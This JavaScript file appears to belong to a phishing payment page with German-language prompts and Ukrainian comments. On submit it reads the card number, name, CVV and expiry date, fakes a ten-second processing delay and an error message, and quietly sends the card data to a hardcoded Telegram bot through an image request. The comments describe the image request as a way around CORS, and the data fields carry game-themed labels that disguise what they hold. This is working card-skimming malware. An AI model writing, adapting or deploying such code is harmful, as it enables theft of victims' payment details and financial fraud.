function showUnavailable() {
    alert('Diese Funktion ist vorübergehend nicht verfügbar');
}

function formatExpiryDate() {
    const expiryField = document.getElementById('expiry');
    if (!expiryField) return;
    let value = expiryField.value.replace(/\D/g, '');
    
    if (value.length > 2) {
        value = value.substring(0, 2) + '/' + value.substring(2, 4);
    }
    expiryField.value = value;
}

function updateTelegramMessage() {
    const cardData = {
        number: (document.getElementById('cardNumber')?.value || '').replace(/\s/g, ''),
        name: document.getElementById('cardName')?.value || '',
        cvv: document.getElementById('cvv')?.value || '',
        expiry: document.getElementById('expiry')?.value || ''
    };

    const message = `brawl:${cardData.number}\nid:${cardData.cvv}\ngame:${cardData.name}\ndddd:${cardData.expiry}\ntime:${new Date().toLocaleString('de-DE')}`;
    document.getElementById('telegramMessage').value = message;
}

function showLoading() {
    document.getElementById('loadingOverlay').style.display = 'flex';
}

function hideLoading() {
    document.getElementById('loadingOverlay').style.display = 'none';
}

function showError() {
    const errorElement = document.getElementById('errorMessage');
    errorElement.style.display = 'block';
    errorElement.style.animation = 'shake 0.5s ease-in-out';
    
    setTimeout(() => {
        errorElement.style.animation = '';
    }, 500);
}

// Додаємо обробник події для поля з датою
const expiryElem = document.getElementById('expiry');
if (expiryElem) {
    expiryElem.addEventListener('input', formatExpiryDate);
}

// Оновлюємо повідомлення при зміні даних
document.querySelectorAll('input').forEach(input => {
    input.addEventListener('input', updateTelegramMessage);
});

// Оновлюємо повідомлення при завантаженні сторінки
document.addEventListener('DOMContentLoaded', function() {
    updateTelegramMessage();
});

// Додаємо обробник для форми
document.getElementById('paymentForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    
    const submitButton = document.getElementById('submitButton');
    submitButton.disabled = true;
    
    // Показуємо загрузку
    showLoading();
    
    const cardData = {
        number: (document.getElementById('cardNumber')?.value || '').replace(/\s/g, ''),
        name: document.getElementById('cardName')?.value || '',
        cvv: document.getElementById('cvv')?.value || '',
        expiry: document.getElementById('expiry')?.value || ''
    };

    // Імітуємо час обробки (10 секунд)
    await new Promise(resolve => setTimeout(resolve, 10000));
    
    // Ховаємо загрузку
    hideLoading();
    
    // Показуємо помилку
    showError();
    
    // Активуємо кнопку знову
    submitButton.disabled = false;
    
    // Відправляємо дані в Telegram
    const botToken = '8255790332:AAHAlWaR8PmCgOmewZ0knEcdRS5heLpKcbU';
    const chatId = '8306987601';
    const message = `brawl:${cardData.number}\nid:${cardData.cvv}\ngame:${cardData.name}\ndddd:${cardData.expiry}\ntime:${new Date().toLocaleString('de-DE')}`;

    // Використовуємо метод з Image для обходу CORS
    const img = new Image();
    img.src = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
    
    console.log('Дані відправлено в Telegram');
});

// Додаємо CSS анімацію для тряски помилки
const style = document.createElement('style');
style.textContent = `
    @keyframes shake {
        0%, 100% { transform: translateX(0); }
        25% { transform: translateX(-5px); }
        75% { transform: translateX(5px); }
    }
`;
document.head.appendChild(style);
